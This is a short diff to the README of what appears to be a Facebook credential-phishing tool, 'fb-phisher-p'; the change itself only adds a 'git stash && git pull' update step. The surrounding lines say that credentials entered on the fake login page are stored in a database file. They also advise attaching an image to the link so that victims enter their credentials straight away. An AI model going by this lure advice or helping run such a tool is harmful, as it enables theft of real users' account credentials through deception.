@@ -44,6 +44,9 @@ Open that and the credentials you have type in login page will be store in **db_
 
 
 you can also attach some sort of image or any thing else with the link so that user immediately enter the credentials 
+## How to update the tool
+
+run this command:- git stash && git pull
 
 # fb-phisher-p
 
